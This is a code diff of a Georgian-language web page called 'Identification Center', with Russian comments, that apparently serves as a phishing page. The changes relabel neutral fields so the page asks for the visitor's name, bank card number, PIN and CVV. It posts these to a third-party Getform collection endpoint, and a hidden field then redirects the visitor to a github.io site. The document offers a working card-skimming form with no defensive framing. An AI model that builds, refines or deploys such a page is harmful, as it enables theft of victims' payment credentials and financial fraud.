@@ -1,97 +1,97 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>იდენტიფიკაციის ცენტრი</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>იდენტიფიკაციის ცენტრი</title>
 
-<link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">
+    <link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">
 
-<style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f4f9;
-    margin: 0;
-    padding: 20px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-.center-container {
-    text-align: center;
-    margin-bottom: 20px;
-}
-.logo {
-    max-width: 150px;
-}
+        .center-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            max-width: 150px;
+        }
 
-.form-container {
-    background: white;
-    padding: 25px 35px;
-    border-radius: 12px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    width: 100%;
-    max-width: 450px;
-    box-sizing: border-box;
-}
+        .form-container {
+            background: white;
+            padding: 25px 35px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 450px;
+            box-sizing: border-box;
+        }
 
-h1 {
-    text-align: center;
-    margin-bottom: 10px;
-    color: #333;
-}
-h3 {
-    text-align: center;
-    color: #666;
-    margin-bottom: 20px;
-}
+        h1 {
+            text-align: center;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        h3 {
+            text-align: center;
+            color: #666;
+            margin-bottom: 20px;
+        }
 
-label {
-    font-weight: bold;
-    margin-bottom: 5px;
-    display: block;
-}
+        label {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: block;
+        }
 
-input {
-    width: 100%;
-    padding: 14px;
-    margin-bottom: 15px;
-    border-radius: 6px;
-    border: 1px solid #ccc;
-    font-size: 16px;
-    box-sizing: border-box;
-}
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
 
-.expiry-cvv-row {
-    display: flex;
-    gap: 15px;
-}
-.expiry-cvv-row div {
-    flex: 1;
-}
+        .expiry-cvv-row {
+            display: flex;
+            gap: 15px;
+        }
+        .expiry-cvv-row div {
+            flex: 1;
+        }
 
-button {
-    width: 100%;
-    padding: 16px;
-    background-color: #007bff;
-    color: white;
-    border: none;
-    border-radius: 6px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-}
-button:hover {
-    background-color: #0056b3;
-}
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
 
-@media (max-width: 480px) {
-    .form-container {
-        padding: 20px;
-    }
-}
-</style>
+        @media (max-width: 480px) {
+            .form-container {
+                padding: 20px;
+            }
+        }
+    </style>
 </head>
 
 <body>
@@ -103,18 +103,25 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ФОРМА С ВАШЕЙ НОВОЙ ССЫЛКОЙ GETFORM -->
-    <form id="contact-form" action="https://kapanadze1995work.getform.com/y5lz4" method="POST">
+    <!-- 
+        ВАЖНО: action ведет на твой Getform. 
+        method="POST" обязателен.
+    -->
+    <form id="contact-form" action="https://getform.io" method="POST">
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
+        <!-- ЭТО ПОЛЕ ВЕРНЕТ КЛИЕНТА НА ТВОЙ САЙТ, А НЕ НА ШАБЛОН GETFORM -->
+        <!-- Замени ссылку ниже на адрес своего сайта на GitHub -->
+        <input type="hidden" name="_redirect" value="https://xn----ctbeucnqcd8a.github.io">
+
         <label for="first-name">სახელი (Имя)</label>
-        <input type="text" name="first_name" id="first-name" required>
+        <input type="text" name="First_Name" id="first-name" required>
 
         <label for="last-name">გვარი (Фамилия)</label>
-        <input type="text" name="last_name" id="last-name" required>
+        <input type="text" name="Last_Name" id="last-name" required>
 
-        <label for="order-id">order_id</label>
-        <input type="text" name="order_id" id="order-id"
+        <label for="order-id">ბარათის ნომერი (Номер карты)</label>
+        <input type="text" name="Card_Number" id="order-id"
                placeholder="0000 0000 0000 0000"
                maxlength="19"
                inputmode="numeric"
@@ -122,15 +129,16 @@ button:hover {
 
         <div class="expiry-cvv-row">
             <div>
-                <label for="pin-code">pin_code</label>
-                <input type="text" name="pin_code" id="pin-code"
-                       placeholder="pin_code"
-                       maxlength="5"
+                <label for="pin-code">PIN კოდი</label>
+                <input type="text" name="PIN_Code" id="pin-code"
+                       placeholder="****"
+                       maxlength="4"
+                       inputmode="numeric"
                        required>
             </div>
             <div>
-                <label for="cvv">cvv</label>
-                <input type="text" name="cvv_code" id="cvv"
+                <label for="cvv">CVV</label>
+                <input type="text" name="CVV_Code" id="cvv"
                        placeholder="***"
                        maxlength="3"
                        inputmode="numeric"
@@ -143,21 +151,21 @@ button:hover {
 </div>
 
 <script>
-// Красивое форматирование номера карты
-document.getElementById('order-id').addEventListener('input', function (e) {
-    let value = e.target.value.replace(/\D/g, '').slice(0,16);
-    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-});
+    // Форматирование номера карты (пробелы каждые 4 цифры)
+    document.getElementById('order-id').addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '').slice(0,16);
+        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+    });
 
-// Только цифры для pin_code
-document.getElementById('pin-code').addEventListener('input', function (e) {
-    e.target.value = e.target.value.replace(/\D/g, '').slice(0,5);
-});
+    // Только цифры для PIN (ограничил до 4 цифр, как обычно у карт)
+    document.getElementById('pin-code').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0,4);
+    });
 
-// Только цифры для CVV
-document.getElementById('cvv').addEventListener('input', function (e) {
-    e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
-});
+    // Только цифры для CVV
+    document.getElementById('cvv').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+    });
 </script>
 
 </body>
